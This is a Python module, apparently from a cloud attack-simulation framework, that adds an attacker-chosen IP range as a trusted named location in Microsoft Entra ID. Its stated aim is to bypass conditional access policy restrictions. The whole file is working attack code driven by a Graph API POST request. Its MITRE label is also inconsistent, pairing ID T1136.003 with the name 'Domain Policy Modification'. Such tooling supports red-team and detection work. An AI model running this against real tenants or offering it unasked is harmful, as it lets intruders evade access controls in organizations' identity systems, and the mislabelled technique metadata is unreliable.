from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.graph_request import GraphRequest

@TechniqueRegistry.register
class EntraAddTrustedIPConfig(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1136.003",
                technique_name="Domain Policy Modification",
                tactics=["Defense Evasion", "Privilege Escalation"],
                sub_technique_name="Cloud Account"
            )
        ]
        
        super().__init__("Add Trusted IP Configuration", "Add trusted IP in named locations to bypass associated conditional access policy restrictions", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            ip_addr: str = kwargs.get('ip_addr', None)
            trusted_policy_name: str = kwargs.get('trusted_policy_name', None)
            
            if trusted_policy_name in [None, ""] or ip_addr in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": "Invalid Technique Input"
                }

            endpoint_url = "https://graph.microsoft.com/v1.0/identity/conditionalAccess/namedLocations"
            
            # Create request payload
            data = {
                "@odata.type": "#microsoft.graph.ipNamedLocation",
                "displayName": trusted_policy_name,
                "isTrusted": 'true',
                "ipRanges": [
                    {
                        "@odata.type": "#microsoft.graph.iPv4CidrRange",
                        "cidrAddress": ip_addr
                    }
                ]
            }
            
            raw_response = GraphRequest().post(url = endpoint_url, data = data)

            # Request successfull
            if 200 <= raw_response.status_code < 300:
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully added IP as trusted named location",
                    "value": {
                        'policy_name' : raw_response.json().get('displayName', 'N/A'),
                        'policy_id' : raw_response.json().get('id', 'N/A'),
                        'ip' : ip_addr,
                        'is_trusted' : raw_response.json().get('isTrusted', 'N/A')
                    }
                }
            
            # Request failed
            else:
                return ExecutionStatus.FAILURE, {
                    "error": {"error_code" : raw_response.json().get('error').get('code', 'N/A'), 
                              "error_message" :raw_response.json().get('error').get('message', 'N/A')
                              },
                    "message": "Failed to add IP as trusted named location"
                }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to add IP as trusted named location"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "ip_addr": {"type": "str", "required": True, "default":None, "name": "IP/CIDR", "input_field_type" : "text"},
            "trusted_policy_name": {"type": "str", "required": True, "default":None, "name": "New Policy Name", "input_field_type" : "text"}
        }